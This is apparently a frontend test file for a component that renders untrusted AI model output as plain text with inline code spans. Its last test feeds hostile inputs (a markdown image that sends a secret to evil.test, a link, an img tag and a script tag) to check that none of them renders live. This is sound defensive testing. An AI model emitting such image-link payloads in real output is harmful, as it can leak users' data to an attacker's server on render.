import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { segments } from "@/lib/modelProse";
import { ModelProse } from "./ModelProse";

describe("segments", () => {
  it("splits a backticked identifier out of the surrounding prose", () => {
    expect(segments("use `::` instead")).toEqual([
      { text: "use ", code: false },
      { text: "::", code: true },
      { text: " instead", code: false },
    ]);
  });

  it("leaves an unmatched run literal rather than eating the rest", () => {
    // The real case from README.md:85 — a fenced block the model opened
    // mid-sentence and never closed.
    const [only] = segments("inside a ```cmd block");
    expect(only).toEqual({ text: "inside a ```cmd block", code: false });
  });

  it("keeps a backtick inside a doubled delimiter", () => {
    expect(segments("``a ` b``")).toEqual([{ text: "a ` b", code: true }]);
  });

  it("returns plain text untouched", () => {
    expect(segments("no code here")).toEqual([
      { text: "no code here", code: false },
    ]);
  });

  it("handles an empty string", () => {
    expect(segments("")).toEqual([]);
  });
});

describe("ModelProse", () => {
  it("renders a code span as <code>, not as backticks", () => {
    render(<ModelProse text="pass `--effort high` here" />);

    const code = screen.getByText("--effort high");
    expect(code.tagName).toBe("CODE");
    expect(screen.queryByText(/`/)).not.toBeInTheDocument();
  });

  /**
   * The property that matters: this is untrusted model output, so no input
   * may produce anything that can fetch. A markdown renderer would turn the
   * first string into an <img> and issue the request on render.
   */
  it.each([
    "![](http://evil.test/x?c=secret)",
    "[click](http://evil.test)",
    "<img src=http://evil.test/x>",
    "<script>alert(1)</script>",
  ])("renders %s as inert text", (hostile) => {
    const { container } = render(<ModelProse text={hostile} />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toBe(hostile);
  });
});
